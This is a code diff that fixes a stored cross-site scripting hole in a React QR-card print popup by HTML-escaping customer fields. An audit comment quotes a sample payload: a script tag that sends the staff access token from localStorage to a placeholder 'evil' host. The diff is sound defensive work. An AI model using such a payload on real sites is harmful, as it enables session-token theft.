@@ -32,20 +32,45 @@ export function QrCardModal({ customerId, onClose }: QrCardModalProps) {
     };
   }, [customerId]);
 
+  // Security-audit finding: card.name/vehicleNumber are dealer/DSM-entered
+  // free text (Customer.name, CreateCustomerDto/QuickAddCustomerDto have no
+  // content restriction) and were being written into this popup's HTML via
+  // a raw template literal — a customer named
+  // `<script>fetch('https://evil/?t='+localStorage.getItem('pumpos.accessToken'))</script>`
+  // would execute that script the next time ANY staff member printed their
+  // QR card. window.open('', ...) opens an about:blank window that browsers
+  // treat as SAME-ORIGIN as this page (specifically so document.write() can
+  // target it) — so that script would run with access to this origin's
+  // localStorage, including the staff JWT (see AuthContext.tsx). Escaping
+  // here is the fix; card.svg is excluded since it's server-generated QR
+  // markup (the `qrcode` package's own SVG output, not free text) that
+  // needs to render as real markup, not escaped text.
+  function escapeHtml(value: string): string {
+    return value
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  }
+
   // Opens a minimal print window containing just the card (SVG for crisp
   // print — Section 6.7 recommends laminated PVC, so resolution matters).
   function handlePrint() {
     if (!card) return;
     const win = window.open('', '_blank', 'width=420,height=560');
     if (!win) return;
+    const safeName = escapeHtml(card.name);
+    const safeVehicleNumber = escapeHtml(card.vehicleNumber ?? '');
+    const safeMemberId = escapeHtml(card.qrMemberId);
     win.document.write(`<!doctype html>
 <html>
-  <head><title>QR card — ${card.name}</title></head>
+  <head><title>QR card — ${safeName}</title></head>
   <body style="font-family: sans-serif; text-align: center; margin: 24px;">
     <div style="width: 300px; margin: 0 auto;">${card.svg}</div>
-    <h2 style="margin: 8px 0 4px;">${card.name}</h2>
-    <div>${card.vehicleNumber ?? ''}</div>
-    <div style="font-size: 12px; color: #666; margin-top: 8px;">Member ID: ${card.qrMemberId}</div>
+    <h2 style="margin: 8px 0 4px;">${safeName}</h2>
+    <div>${safeVehicleNumber}</div>
+    <div style="font-size: 12px; color: #666; margin-top: 8px;">Member ID: ${safeMemberId}</div>
   </body>
 </html>`);
     win.document.close();
